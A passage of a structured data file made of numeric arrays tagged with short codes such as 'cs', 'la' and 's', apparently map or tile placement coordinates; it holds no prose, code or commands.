"cs", 0, 224, 9, 1], [1, "cs", 1, 223, 8, 1], [1, "cs", 2, 224, 8, 1], [1, "cs", 2, 222, 8, 1], [1, "cs", 0, 224, 6, 1], [1, "cs", 0, 222, 5, 1], [1, "cs", 0, 219, 7, 1], [1, "cs", 1, 220, 5, 1], [1, "cs", 1, 217, 7, 1], [1, "cs", 2, 224, 5, 1], [1, "cs", 2, 223, 5, 1], [1, "cs", 2, 224, 7, 1], [1, "cs", 2, 223, 7, 1], [1, "cs", 2, 223, 6, 1], [1, "cs", 2, 222, 6, 1], [1, "cs", 2, 222, 7, 1], [1, "cs", 2, 221, 7, 1], [1, "cs", 2, 221, 6, 1], [1, "cs", 2, 221, 5, 1], [1, "cs", 2, 220, 6, 1], [1, "cs", 2, 220, 7, 1], [1, "cs", 2, 220, 8, 1], [1, "cs", 2, 219, 8, 1], [1, "cs", 2, 219, 6, 1], [1, "cs", 2, 219, 5, 1], [1, "cs", 0, 218, 5, 1], [1, "cs", 0, 216, 8, 1], [1, "cs", 2, 218, 8, 1], [1, "cs", 2, 217, 8, 1], [1, "cs", 2, 218, 7, 1], [1, "cs", 2, 218, 6, 1], [1, "cs", 2, 217, 6, 1], [1, "cs", 2, 217, 5, 1], [1, "cs", 1, 215, 6, 1], [1, "cs", 1, 213, 5, 1], [1, "cs", 0, 214, 6, 1], [1, "cs", 0, 216, 5, 1], [1, "cs", 0, 213, 8, 1], [1, "cs", 0, 211, 7, 1], [1, "cs", 0, 209, 5, 1], [1, "cs", 0, 208, 7, 1], [1, "cs", 0, 207, 8, 1], [1, "cs", 2, 216, 6, 1], [1, "cs", 2, 216, 7, 1], [1, "cs", 2, 215, 7, 1], [1, "cs", 2, 215, 8, 1], [1, "cs", 2, 214, 8, 1], [1, "cs", 2, 214, 7, 1], [1, "cs", 2, 215, 5, 1], [1, "cs", 2, 214, 5, 1], [1, "cs", 2, 213, 6, 1], [1, "cs", 2, 213, 7, 1], [1, "cs", 2, 212, 7, 1], [1, "cs", 1, 211, 5, 1], [1, "cs", 1, 209, 8, 1], [1, "cs", 2, 212, 8, 1], [1, "cs", 2, 211, 8, 1], [1, "cs", 2, 210, 8, 1], [1, "cs", 2, 209, 7, 1], [1, "cs", 2, 210, 7, 1], [1, "cs", 2, 210, 6, 1], [1, "cs", 2, 212, 6, 1], [1, "cs", 2, 212, 5, 1], [1, "cs", 2, 211, 6, 1], [1, "cs", 2, 210, 5, 1], [1, "cs", 2, 209, 6, 1], [1, "cs", 2, 208, 6, 1], [1, "cs", 2, 208, 5, 1], [1, "cs", 2, 207, 7, 1], [1, "cs", 2, 207, 6, 1], [1, "cs", 2, 207, 5, 1], [1, "cs", 2, 206, 5, 1], [1, "cs", 2, 208, 8, 1], [1, "cs", 2, 206, 6, 1], [1, "cs", 0, 204, 8, 1], [1, "cs", 0, 205, 6, 1], [1, "cs", 0, 203, 5, 1], [1, "cs", 0, 202, 7, 1], [1, "cs", 0, 199, 8, 1], [1, "cs", 0, 200, 6, 1], [1, "cs", 0, 197, 6, 1], [1, "cs", 0, 195, 8, 1], [1, "cs", 0, 194, 6, 1], [1, "cs", 1, 202, 8, 1], [1, "cs", 1, 206, 7, 1], [1, "cs", 1, 201, 5, 1], [1, "cs", 1, 197, 8, 1], [1, "cs", 1, 192, 7, 1], [1, "cs", 1, 195, 5, 1], [1, "cs", 2, 205, 7, 1], [1, "cs", 2, 205, 8, 1], [1, "cs", 2, 206, 8, 1], [1, "cs", 2, 204, 7, 1], [1, "cs", 2, 204, 6, 1], [1, "cs", 2, 204, 5, 1], [1, "cs", 2, 205, 5, 1], [1, "cs", 2, 203, 6, 1], [1, "cs", 2, 203, 7, 1], [1, "cs", 2, 203, 8, 1], [1, "cs", 2, 201, 8, 1], [1, "cs", 2, 200, 8, 1], [1, "cs", 2, 200, 7, 1], [1, "cs", 2, 201, 7, 1], [1, "cs", 2, 201, 6, 1], [1, "cs", 2, 202, 5, 1], [1, "cs", 2, 202, 6, 1], [1, "cs", 2, 200, 5, 1], [1, "cs", 2, 199, 5, 1], [1, "cs", 2, 197, 5, 1], [1, "cs", 2, 196, 5, 1], [1, "cs", 2, 198, 5, 1], [1, "cs", 2, 198, 6, 1], [1, "cs", 2, 199, 6, 1], [1, "cs", 2, 199, 7, 1], [1, "cs", 2, 198, 7, 1], [1, "cs", 2, 198, 8, 1], [1, "cs", 2, 197, 7, 1], [1, "cs", 2, 196, 7, 1], [1, "cs", 2, 196, 8, 1], [1, "cs", 2, 196, 6, 1], [1, "cs", 2, 195, 6, 1], [1, "cs", 2, 195, 7, 1], [1, "cs", 2, 194, 7, 1], [1, "cs", 2, 193, 8, 1], [1, "cs", 2, 194, 8, 1], [1, "cs", 2, 193, 7, 1], [1, "cs", 2, 193, 6, 1], [1, "cs", 2, 193, 5, 1], [1, "cs", 2, 194, 5, 1], [1, "cs", 0, 192, 5, 1], [1, "cs", 0, 191, 8, 1], [1, "cs", 0, 190, 6, 1], [1, "cs", 0, 188, 7, 1], [1, "cs", 0, 186, 8, 1], [1, "cs", 0, 186, 5, 1], [1, "cs", 0, 184, 7, 1], [1, "cs", 0, 182, 8, 1], [1, "cs", 0, 181, 6, 1], [1, "cs", 1, 189, 8, 1], [1, "cs", 1, 183, 8, 1], [1, "cs", 1, 188, 5, 1], [1, "cs", 1, 185, 6, 1], [1, "cs", 1, 180, 7, 1], [1, "cs", 1, 183, 5, 1], [1, "cs", 1, 178, 8, 1], [1, "cs", 1, 177, 6, 1], [1, "cs", 1, 173, 7, 1], [1, "cs", 1, 171, 7, 1], [1, "cs", 0, 177, 8, 1], [1, "cs", 0, 175, 7, 1], [1, "cs", 0, 179, 5, 1], [1, "cs", 0, 174, 5, 1], [1, "cs", 0, 176, 5, 1], [1, "cs", 0, 172, 8, 1], [1, "cs", 0, 170, 8, 1], [1, "cs", 0, 169, 6, 1], [1, "cs", 2, 192, 6, 1], [1, "cs", 2, 192, 8, 1], [1, "cs", 2, 191, 7, 1], [1, "cs", 2, 191, 6, 1], [1, "cs", 2, 191, 5, 1], [1, "cs", 2, 190, 5, 1], [1, "cs", 2, 189, 5, 1], [1, "cs", 2, 189, 6, 1], [1, "cs", 2, 189, 7, 1], [1, "cs", 2, 190, 7, 1], [1, "cs", 2, 190, 8, 1], [1, "cs", 2, 188, 8, 1], [1, "cs", 2, 187, 8, 1], [1, "cs", 2, 187, 7, 1], [1, "cs", 2, 187, 6, 1], [1, "cs", 2, 188, 6, 1], [1, "cs", 2, 187, 5, 1], [1, "cs", 2, 186, 6, 1], [1, "cs", 2, 186, 7, 1], [1, "cs", 2, 185, 7, 1], [1, "cs", 2, 185, 8, 1], [1, "cs", 2, 184, 8, 1], [1, "cs", 2, 183, 7, 1], [1, "cs", 2, 183, 6, 1], [1, "cs", 2, 184, 6, 1], [1, "cs", 2, 184, 5, 1], [1, "cs", 2, 185, 5, 1], [1, "cs", 2, 182, 6, 1], [1, "cs", 2, 182, 7, 1], [1, "cs", 2, 181, 7, 1], [1, "cs", 2, 181, 8, 1], [1, "cs", 2, 180, 8, 1], [1, "cs", 2, 179, 8, 1], [1, "cs", 2, 182, 5, 1], [1, "cs", 2, 181, 5, 1], [1, "cs", 2, 180, 5, 1], [1, "cs", 2, 180, 6, 1], [1, "cs", 2, 179, 6, 1], [1, "cs", 2, 179, 7, 1], [1, "cs", 2, 178, 7, 1], [1, "cs", 2, 178, 6, 1], [1, "cs", 2, 178, 5, 1], [1, "cs", 2, 177, 5, 1], [1, "cs", 2, 177, 7, 1], [1, "cs", 2, 176, 7, 1], [1, "cs", 2, 176, 6, 1], [1, "cs", 2, 175, 6, 1], [1, "cs", 2, 175, 5, 1], [1, "cs", 2, 176, 8, 1], [1, "cs", 2, 174, 8, 1], [1, "cs", 2, 175, 8, 1], [1, "cs", 2, 173, 8, 1], [1, "cs", 2, 174, 7, 1], [1, "cs", 2, 173, 6, 1], [1, "cs", 2, 174, 6, 1], [1, "cs", 2, 172, 5, 1], [1, "cs", 2, 173, 5, 1], [1, "cs", 2, 172, 6, 1], [1, "cs", 2, 172, 7, 1], [1, "cs", 2, 171, 8, 1], [1, "cs", 2, 170, 7, 1], [1, "cs", 2, 170, 6, 1], [1, "cs", 2, 170, 5, 1], [1, "cs", 2, 171, 5, 1], [1, "cs", 2, 171, 6, 1], [1, "cs", 2, 169, 5, 1], [1, "cs", 2, 169, 7, 1], [1, "cs", 2, 169, 8, 1], [1, "cs", 1, 168, 7, 1], [1, "cs", 1, 166, 5, 1], [1, "cs", 1, 164, 7, 1], [1, "cs", 1, 160, 7, 1], [1, "cs", 1, 156, 8, 1], [1, "cs", 0, 166, 8, 1], [1, "cs", 0, 168, 5, 1], [1, "cs", 0, 164, 6, 1], [1, "cs", 0, 162, 7, 1], [1, "cs", 0, 158, 8, 1], [1, "cs", 0, 157, 6, 1], [1, "cs", 0, 161, 5, 1], [1, "cs", 0, 159, 5, 1], [1, "cs", 0, 155, 7, 1], [1, "cs", 0, 154, 5, 1], [1, "cs", 0, 151, 7, 1], [1, "cs", 1, 153, 8, 1], [1, "cs", 1, 151, 5, 1], [1, "cs", 2, 168, 6, 1], [1, "cs", 2, 168, 8, 1], [1, "cs", 2, 167, 8, 1], [1, "cs", 2, 167, 7, 1], [1, "cs", 2, 167, 6, 1], [1, "cs", 2, 167, 5, 1], [1, "cs", 2, 166, 6, 1], [1, "cs", 2, 166, 7, 1], [1, "cs", 2, 165, 7, 1], [1, "cs", 2, 165, 6, 1], [1, "cs", 2, 165, 5, 1], [1, "cs", 2, 164, 5, 1], [1, "cs", 2, 163, 5, 1], [1, "cs", 2, 162, 5, 1], [1, "cs", 2, 162, 6, 1], [1, "cs", 2, 163, 6, 1], [1, "cs", 2, 163, 7, 1], [1, "cs", 2, 163, 8, 1], [1, "cs", 2, 164, 8, 1], [1, "cs", 2, 165, 8, 1], [1, "cs", 2, 161, 8, 1], [1, "cs", 2, 162, 8, 1], [1, "cs", 2, 160, 8, 1], [1, "cs", 2, 159, 8, 1], [1, "cs", 2, 159, 7, 1], [1, "cs", 2, 159, 6, 1], [1, "cs", 2, 160, 5, 1], [1, "cs", 2, 160, 6, 1], [1, "cs", 2, 161, 6, 1], [1, "cs", 2, 161, 7, 1], [1, "cs", 2, 157, 7, 1], [1, "cs", 2, 158, 7, 1], [1, "cs", 2, 158, 6, 1], [1, "cs", 2, 158, 5, 1], [1, "cs", 2, 155, 5, 1], [1, "cs", 2, 155, 6, 1], [1, "cs", 2, 156, 6, 1], [1, "cs", 2, 156, 7, 1], [1, "cs", 2, 157, 8, 1], [1, "cs", 2, 155, 8, 1], [1, "cs", 2, 154, 8, 1], [1, "cs", 2, 154, 7, 1], [1, "cs", 2, 154, 6, 1], [1, "cs", 2, 152, 8, 1], [1, "cs", 2, 153, 7, 1], [1, "cs", 2, 153, 6, 1], [1, "cs", 2, 153, 5, 1], [1, "cs", 2, 152, 5, 1], [1, "cs", 2, 152, 6, 1], [1, "cs", 2, 152, 7, 1], [1, "cs", 2, 151, 6, 1], [1, "cs", 2, 157, 5, 1], [1, "cs", 1, 156, 5, 1], [1, "cs", 0, 150, 5, 1], [1, "cs", 0, 149, 7, 1], [1, "cs", 0, 147, 8, 1], [1, "cs", 0, 146, 5, 1], [1, "cs", 0, 144, 7, 1], [1, "cs", 0, 142, 5, 1], [1, "cs", 1, 147, 6, 1], [1, "cs", 1, 145, 8, 1], [1, "cs", 1, 144, 5, 1], [1, "cs", 2, 148, 5, 1], [1, "cs", 2, 149, 5, 1], [1, "cs", 2, 150, 6, 1], [1, "cs", 2, 150, 8, 1], [1, "cs", 2, 151, 8, 1], [1, "cs", 2, 150, 7, 1], [1, "cs", 2, 149, 8, 1], [1, "cs", 2, 148, 8, 1], [1, "cs", 2, 149, 6, 1], [1, "cs", 2, 148, 6, 1], [1, "cs", 2, 148, 7, 1], [1, "cs", 2, 147, 7, 1], [1, "cs", 2, 147, 5, 1], [1, "cs", 2, 146, 6, 1], [1, "cs", 2, 146, 7, 1], [1, "cs", 2, 146, 8, 1], [1, "cs", 2, 145, 7, 1], [1, "cs", 2, 145, 6, 1], [1, "cs", 2, 145, 5, 1], [1, "cs", 2, 144, 6, 1], [1, "cs", 2, 143, 5, 1], [1, "cs", 2, 143, 6, 1], [1, "cs", 2, 142, 6, 1], [1, "cs", 2, 141, 5, 1], [1, "cs", 2, 224, 10, 1], [1, "cs", 0, 224, 11, 1], [1, "cs", 0, 224, 13, 1], [1, "cs", 0, 224, 17, 1], [1, "cs", 0, 224, 19, 1], [1, "cs", 0, 224, 22, 1], [1, "cs", 0, 224, 24, 1], [1, "cs", 0, 224, 29, 1], [1, "cs", 0, 224, 33, 1], [1, "cs", 0, 224, 35, 1], [1, "cs", 0, 224, 38, 1], [1, "cs", 1, 224, 14, 1], [1, "cs", 1, 224, 20, 1], [1, "cs", 1, 224, 27, 1], [1, "cs", 1, 224, 31, 1], [1, "cs", 1, 224, 36, 1], [1, "cs", 2, 224, 12, 1], [1, "cs", 2, 224, 15, 1], [1, "cs", 2, 224, 16, 1], [1, "cs", 2, 224, 18, 1], [1, "cs", 2, 224, 21, 1], [1, "cs", 2, 224, 23, 1], [1, "cs", 2, 224, 25, 1], [1, "cs", 2, 224, 26, 1], [1, "cs", 2, 224, 28, 1], [1, "cs", 2, 224, 30, 1], [1, "cs", 2, 224, 32, 1], [1, "cs", 2, 224, 34, 1], [1, "cs", 2, 224, 37, 1], [1, "cs", 2, 224, 39, 1], [1, "cs", 0, 224, 41, 1], [1, "cs", 0, 224, 44, 1], [1, "cs", 0, 224, 46, 1], [1, "cs", 0, 224, 52, 1], [1, "cs", 0, 224, 57, 1], [1, "cs", 1, 224, 47, 1], [1, "cs", 2, 224, 40, 1], [1, "cs", 2, 224, 42, 1], [1, "cs", 2, 224, 43, 1], [1, "cs", 2, 224, 45, 1], [1, "cs", 2, 224, 49, 1], [1, "cs", 1, 224, 50, 1], [1, "cs", 2, 224, 51, 1], [1, "la", 3, 224, 54, 1], [1, "cs", 2, 224, 56, 1], [1, "cs", 2, 224, 58, 1], [1, "cs", 2, 224, 61, 1], [1, "cs", 0, 224, 60, 1], [1, "cs", 0, 224, 64, 1], [1, "cs", 0, 224, 66, 1], [1, "cs", 0, 224, 70, 1], [1, "cs", 0, 224, 74, 1], [1, "cs", 0, 224, 77, 1], [1, "cs", 1, 224, 62, 1], [1, "cs", 1, 224, 68, 1], [1, "cs", 1, 224, 72, 1], [1, "cs", 1, 224, 76, 1], [1, "cs", 1, 224, 80, 1], [1, "cs", 1, 224, 83, 1], [1, "cs", 1, 224, 91, 1], [1, "cs", 1, 224, 95, 1], [1, "cs", 1, 224, 97, 1], [1, "cs", 0, 224, 85, 1], [1, "cs", 0, 224, 88, 1], [1, "cs", 0, 224, 93, 1], [1, "cs", 0, 224, 98, 1], [1, "cs", 2, 224, 59, 1], [1, "cs", 2, 224, 63, 1], [1, "cs", 2, 224, 65, 1], [1, "cs", 2, 224, 67, 1], [1, "cs", 2, 224, 69, 1], [1, "cs", 2, 224, 71, 1], [1, "cs", 2, 224, 73, 1], [1, "cs", 2, 224, 75, 1], [1, "cs", 2, 224, 78, 1], [1, "cs", 2, 224, 79, 1], [1, "cs", 2, 224, 81, 1], [1, "cs", 2, 224, 82, 1], [1, "cs", 2, 224, 84, 1], [1, "cs", 2, 224, 86, 1], [1, "cs", 2, 224, 87, 1], [1, "cs", 2, 224, 89, 1], [1, "cs", 2, 224, 90, 1], [1, "cs", 2, 224, 92, 1], [1, "cs", 2, 224, 94, 1], [1, "cs", 2, 224, 96, 1], [1, "cs", 2, 224, 99, 1], [1, "cs", 2, 224, 100, 1], [1, "cs", 0, 224, 101, 1], [1, "cs", 1, 224, 103, 1], [1, "cs", 2, 224, 102, 1], [1, "cs", 0, 222, 10, 1], [1, "cs", 2, 223, 9, 1], [1, "cs", 2, 222, 9, 1], [1, "cs", 2, 221, 9, 1], [1, "cs", 2, 223, 10, 1], [1, "cs", 2, 223, 11, 1], [1, "cs", 2, 223, 12, 1], [1, "cs", 3, 223, 13, 1], [1, "cs", 3, 222, 11, 1], [1, "cs", 3, 220, 9, 1], [1, "cs", 3, 219, 9, 1], [1, "cs", 3, 221, 10, 1], [1, "re", 2, 219, 13, 1], [1, "re", 1, 218, 18, 1], [1, "re", 1, 214, 13, 1], [1, "cs", 0, 221, 20, 1], [1, "cs", 1, 223, 18, 1], [1, "cs", 2, 222, 19, 1], [1, "cs", 2, 223, 19, 1], [1, "cs", 2, 223, 20, 1], [1, "cs", 2, 222, 20, 1], [1, "cs", 2, 220, 21, 1], [1, "cs", 0, 219, 21, 1], [1, "cs", 3, 221, 21, 1], [1, "cs", 3, 218, 21, 1], [1, "cs", 3, 222, 21, 1], [1, "cs", 3, 220, 22, 1], [1, "cs", 3, 219, 22, 1], [1, "cs", 3, 221, 22, 1], [1, "cs", 0, 211, 9, 1], [1, "cs", 1, 211, 10, 1], [1, "cs", 1, 210, 12, 1], [1, "cs", 0, 211, 13, 1], [1, "cs", 2, 210, 9, 1], [1, "cs", 2, 210, 10, 1], [1, "cs", 2, 210, 11, 1], [1, "cs", 2, 212, 9, 1], [1, "cs", 2, 210, 13, 1], [1, "cs", 2, 211, 12, 1], [1, "cs", 2, 211, 11, 1], [1, "cs", 2, 211, 14, 1], [1, "cs", 2, 212, 15, 1], [1, "cs", 2, 210, 14, 1], [1, "cs", 3, 211, 15, 1], [1, "cs", 3, 213, 9, 1], [1, "cs", 3, 212, 10, 1], [1, "cs", 3, 223, 21, 1], [1, "cs", 3, 209, 9, 1], [1, "la", 3, 223, 22, 1], [1, "la", 3, 221, 23, 1], [1, "la", 3, 207, 9, 1], [1, "la", 3, 209, 10, 1], [1, "la", 0, 209, 12, 1], [1, "la", 4, 209, 14, 1], [1, "la", 4, 219, 23, 1], [1, "la", 3, 210, 15, 1], [1, "la", 3, 217, 22, 1], [1, "la", 4, 212, 16, 1], [1, "la", 2, 214, 19, 1], [1, "la", 4, 213, 20, 1], [1, "la", 1, 212, 21, 1], [1, "la", 4, 215, 18, 1], [1, "la", 2, 216, 17, 1], [1, "la", 5, 216, 16, 1], [1, "la", 5, 216, 15, 1], [1, "la", 1, 217, 16, 1], [1, "la", 2, 218, 16, 1], [1, "la", 2, 216, 14, 1], [1, "la", 2, 219, 16, 1], [1, "la", 5, 220, 16, 1], [1, "la", 5, 216, 13, 1], [1, "la", 4, 217, 15, 1], [1, "cs", 0, 211, 44, 1], [1, "cs", 1, 212, 45, 1], [1, "cs", 2, 213, 45, 1], [1, "cs", 0, 214, 46, 1], [1, "cs", 2, 215, 46, 1], [1, "cs", 3, 213, 46, 1], [1, "cs", 3, 214, 47, 1], [1, "cs", 3, 214, 48, 1], [1, "cs", 3, 216, 46, 1], [1, "cs", 0, 208, 20, 1], [1, "cs", 0, 210, 21, 1], [1, "cs", 0, 212, 23, 1], [1, "cs", 0, 213, 25, 1], [1, "cs", 2, 213, 24, 1], [1, "cs", 2, 211, 22, 1], [1, "cs", 2, 210, 20, 1], [1, "cs", 2, 209, 21, 1], [1, "cs", 2, 209, 20, 1], [1, "cs", 2, 211, 21, 1], [1, "cs", 2, 212, 22, 1], [1, "cs", 2, 213, 23, 1], [1, "cs", 3, 213, 26, 1], [1, "cs", 3, 207, 20, 1], [1, "la", 4, 192, 33, 1], [1, "la", 4, 191, 34, 1], [1, "la", 4, 190, 35, 1], [1, "la", 3, 189, 37, 1], [1, "la", 3, 188, 39, 1], [1, "la", 4, 186, 40, 1], [1, "la", 4, 185, 39, 1], [1, "la", 4, 184, 39, 1], [1, "la", 2, 183, 39, 1], [1, "la", 1, 182, 40, 1], [1, "la", 2, 181, 41, 1], [1, "la", 5, 180, 41, 1], [1, "la", 5, 179, 41, 1], [1, "la", 4, 192, 28, 1], [1, "la", 4, 191, 28, 1], [1, "la", 4, 190, 27, 1], [1, "la", 3, 188, 27, 1], [1, "la", 4, 187, 26, 1], [1, "la", 4, 186, 25, 1], [1, "la", 4, 185, 25, 1], [1, "la", 4, 184, 24, 1], [1, "la", 5, 184, 23, 1], [1, "la", 2, 184, 22, 1], [1, "la", 5, 184, 21, 1], [1, "la", 1, 183, 20, 1], [1, "la", 5, 182, 20, 1], [1, "la", 2, 181, 20, 1], [1, "la", 5, 180, 20, 1], [1, "la", 2, 179, 20, 1], [1, "la", 4, 178, 19, 1], [1, "la", 3, 178, 17, 1], [1, "la", 3, 176, 18, 1], [1, "cs", 0, 177, 15, 1], [1, "cs", 0, 175, 17, 1], [1, "cs", 0, 180, 16, 1], [1, "cs", 0, 174, 19, 1], [1, "cs", 0, 172, 20, 1], [1, "cs", 1, 175, 15, 1], [1, "cs", 1, 172, 18, 1], [1, "cs", 1, 181, 15, 1], [1, "cs", 2, 179, 15, 1], [1, "cs", 2, 177, 16, 1], [1, "cs", 2, 176, 16, 1], [1, "cs", 2, 174, 18, 1], [1, "cs", 2, 173, 19, 1], [1, "cs", 2, 172, 19, 1], [1, "cs", 2, 173, 18, 1], [1, "cs", 2, 173, 17, 1], [1, "cs", 2, 174, 17, 1], [1, "cs", 2, 174, 16, 1], [1, "cs", 2, 175, 16, 1], [1, "cs", 2, 176, 15, 1], [1, "cs", 2, 178, 15, 1], [1, "cs", 2, 178, 16, 1], [1, "cs", 2, 179, 16, 1], [1, "cs", 2, 180, 15, 1], [1, "cs", 2, 181, 16, 1], [1, "cs", 3, 182, 16, 1], [1, "cs", 3, 172, 21, 1], [1, "la", 1, 175, 19, 1], [1, "la", 2, 174, 20, 1], [1, "la", 2, 173, 20, 1], [1, "la", 1, 180, 17, 1], [1, "la", 2, 181, 17, 1], [1, "la", 3, 191, 20, 1], [1, "s", 0, 217, 30, 1], [1, "s", 0, 208, 35, 1], [1, "s", 0, 204, 24, 1], [1, "s", 1, 218, 32, 1], [1, "s", 1, 207, 34, 1], [1, "s", 1, 202, 23, 1], [1, "s", 1, 195, 16, 1], [1, "s", 2, 222, 28, 1], [1, "s", 2, 212, 38, 1], [1, "s", 2, 207, 23, 1], [1, "s", 2, 202, 12, 1], [1, "s", 2, 195, 18, 1], [1, "s", 1, 191, 12, 1], [1, "s", 0, 187, 16, 1], [1, "s", 2, 188, 16, 1], [1, "s", 1, 186, 14, 1], [1, "s", 1, 201, 16, 1], [1, "g", 1, 216, 31, 1], [1, "g", 0, 200, 15, 1], [1, "g", 0, 202, 40, 1], [1, "g", 0, 189, 32, 1], [1, "g", 0, 204, 28, 1], [1, "g", 0, 196, 24, 1], [1, "g", 2, 198, 37, 1], [1, "s", 0, 193, 39, 1], [1, "s", 0, 201, 45, 1], [1, "a", 0, 210, 29, 1], [1, "a", 0, 200, 20, 1], [1, "cs", 0, 200, 34, 1], [1, "cs", 0, 193, 27, 1], [1, "cs", 1, 203, 30, 1], [1, "cs", 1, 191, 31, 1], [1, "cs", 2, 202, 32, 1], [1, "cs", 2, 194, 26, 1], [1, "cs", 2, 192, 27, 1], [1, "cs", 2, 192, 32, 1], [1, "cs", 2, 203, 31, 1], [1, "cs", 2, 202, 31, 1], [1, "cs", 2, 202, 30, 1], [1, "cs", 3, 202, 29, 1], [1, "cs", 3, 201, 32, 1], [1, "cs", 3, 199, 35, 1], [1, "cs", 0, 193, 34, 1], [1, "cs", 2, 194, 34, 1], [1, "cs", 2, 198, 35, 1], [1, "cs", 3, 199, 34, 1], [1, "cs", 3, 191, 29, 1], [1, "cs", 0, 191, 30, 1], [1, "cs", 3, 190, 29, 1], [1, "la", 3, 180, 69, 1], [1, "la", 3, 182, 68, 1], [1, "la", 3, 184, 68, 1], [1, "la", 3, 186, 70, 1], [1, "la", 3, 184, 72, 1], [1, "la", 3, 182, 72, 1], [1, "la", 3, 180, 71, 1], [1, "cs", 0, 186, 68, 1], [1, "cs", 0, 187, 70, 1], [1, "cs", 0, 183, 74, 1], [1, "cs", 0, 178, 70, 1], [1, "cs", 2, 182, 66, 1], [1, "cs", 2, 182, 74, 1], [1, "cs", 2, 181, 73, 1], [1, "cs", 2, 180, 74, 1], [1, "cs", 2, 181, 74, 1], [1, "la", 0, 184, 70, 1], [1, "la", 3, 182, 70, 1], [1, "cs", 2, 181, 67, 1], [1, "cs", 3, 184, 67, 1], [1, "cs", 3, 182, 67, 1], [1, "la", 4, 187, 69, 1], [1, "la", 1, 188, 68, 1], [1, "la", 4, 189, 68, 1], [1, "la", 2, 190, 68, 1], [1, "la", 1, 191, 68, 1], [1, "la", 4, 192, 68, 1], [1, "la", 2, 193, 68, 1], [1, "la", 4, 194, 69, 1], [1, "la", 2, 194, 70, 1], [1, "la", 5, 195, 71, 1], [1, "la", 1, 194, 71, 1], [1, "la", 2, 196, 72, 1], [1, "la", 4, 196, 71, 1], [1, "la", 1, 197, 73, 1], [1, "la", 5, 196, 73, 1], [1, "la", 5, 198, 73, 1], [1, "la", 3, 201, 73, 1], [1, "la", 3, 203, 72, 1], [1, "la", 4, 199, 73, 1], [1, "la", 1, 205, 72, 1], [1, "la", 2, 206, 72, 1], [1, "la", 5, 207, 72, 1], [1, "la", 1, 208, 72, 1], [1, "la", 1, 209, 73, 1], [1, "la", 2, 209, 74, 1], [1, "la", 5, 211, 76, 1], [1, "la", 4, 210, 75, 1], [1, "la", 5, 212, 76, 1], [1, "la", 4, 202, 75, 1], [1, "la", 2, 203, 76, 1], [1, "la", 4, 204, 77, 1], [1, "la", 2, 204, 78, 1], [1, "la", 2, 204, 79, 1], [1, "la", 5, 204, 80, 1], [1, "cs", 0, 202, 74, 1], [1, "cs", 1, 203, 74, 1], [1, "cs", 2, 204, 73, 1], [1, "cs", 2, 203, 75, 1], [1, "cs", 3, 204, 76, 1], [1, "cs", 3, 205, 73, 1], [1, "cs", 0, 205, 74, 1], [1, "cs", 2, 204, 74, 1], [1, "cs", 2, 204, 75, 1], [1, "cs", 2, 206, 73, 1], [1, "cs", 3, 207, 73, 1], [1, "cs", 2, 205, 76, 1], [1, "cs", 3, 205, 77, 1], [1, "la", 3, 183, 66, 1], [1, "la", 4, 183, 65, 1], [1, "la", 4, 184, 64, 1], [1, "la", 4, 185, 63, 1], [1, "la", 1, 185, 62, 1], [1, "la", 2, 185, 61, 1], [1, "la", 2, 185, 60, 1], [1, "la", 4, 186, 59, 1], [1, "la", 1, 187, 58, 1], [1, "la", 2, 187, 57, 1], [1, "la", 2, 187, 56, 1], [1, "s", 0, 191, 60, 1], [1, "s", 1, 195, 58, 1], [1, "s", 1, 199, 46, 1], [1, "s", 2, 202, 49, 1], [1, "g", 2, 197, 55, 1], [1, "g", 1, 213, 55, 1], [1, "g", 0, 192, 45, 1], [1, "g", 0, 210, 61, 1], [1, "g", 0, 182, 52, 1], [1, "g", 0, 180, 35, 1], [1, "g", 0, 175, 25, 1], [1, "g", 0, 168, 32, 1], [1, "g", 1, 179, 28, 1], [1, "g", 1, 161, 16, 1], [1, "g", 2, 172, 12, 1], [1, "g", 2, 160, 25, 1], [1, "g", 2, 157, 39, 1], [1, "g", 2, 170, 43, 1], [1, "g", 2, 202, 67, 1], [1, "g", 2, 217, 72, 1], [1, "g", 2, 214, 82, 1], [1, "g", 2, 193, 86, 1], [1, "g", 2, 168, 60, 1], [1, "g", 2, 165, 78, 1], [1, "g", 2, 173, 88, 1], [1, "s", 0, 185, 51, 1], [1, "s", 0, 175, 44, 1], [1, "s", 0, 165, 50, 1], [1, "s", 0, 160, 32, 1], [1, "s", 1, 162, 30, 1], [1, "s", 1, 176, 28, 1], [1, "s", 1, 154, 17, 1], [1, "s", 1, 184, 49, 1], [1, "s", 1, 192, 62, 1], [1, "s", 1, 216, 62, 1], [1, "s", 1, 204, 65, 1], [1, "s", 1, 217, 79, 1], [1, "s", 1, 206, 86, 1], [1, "la", 3, 211, 69, 1], [1, "la", 4, 215, 69, 1], [1, "la", 5, 201, 81, 1], [1, "la", 1, 207, 83, 1], [1, "la", 3, 173, 32, 1], [1, "la", 2, 181, 45, 1], [1, "la", 1, 178, 38, 1], [1, "la", 1, 213, 69, 1], [1, "la", 5, 214, 69, 1], [1, "la", 4, 216, 68, 1], [1, "la", 0, 191, 78, 1], [1, "la", 3, 191, 80, 1], [1, "la", 3, 189, 79, 1], [1, "g", 2, 150, 29, 1], [1, "g", 2, 154, 67, 1], [1, "g", 2, 202, 94, 1], [1, "g", 2, 155, 90, 1], [1, "s", 2, 215, 80, 1], [1, "s", 2, 204, 62, 1], [1, "s", 2, 218, 60, 1], [1, "s", 2, 194, 62, 1], [1, "s", 0, 216, 86, 1], [1, "s", 0, 211, 93, 1], [1, "la", 0, 216, 92, 1], [1, "la", 0, 151, 96, 1], [1, "la", 1, 155, 95, 1], [1, "la", 4, 214, 88, 1], [1, "s", 0, 205, 99, 1], [1, "s", 1, 217, 88, 1], [1, "s", 1, 213, 94, 1], [1, "s", 1, 202, 97, 1], [1, "s", 0, 199, 85, 1], [1, "s", 0, 190, 93, 1], [1, "s", 1, 199, 87, 1], [1, "s", 1, 192, 97, 1], [1, "la", 3, 196, 92, 1], [1, "la", 1, 199, 91, 1], [1, "la", 1, 220, 91, 1], [1, "la", 0, 219, 77, 1], [1, "la", 0, 200, 59, 1], [1, "la", 3, 188, 87, 1], [1, "la", 0, 183, 94, 1], [1, "la", 1, 187, 83, 1], [1, "la", 1, 175, 82, 1], [1, "la", 1, 172, 94, 1], [1, "la", 2, 179, 78, 1], [1, "la", 0, 166, 87, 1], [1, "la", 3, 159, 80, 1], [1, "la", 3, 167, 15, 1], [1, "la", 1, 164, 17, 1], [1, "la", 1, 172, 28, 1], [1, "la", 3, 153, 24, 1], [1, "la", 4, 164, 91, 1], [1, "la", 4, 156, 82, 1], [1, "la", 4, 149, 90, 1], [1, "s", 0, 178, 85, 1], [1, "s", 1, 180, 85, 1], [1, "s", 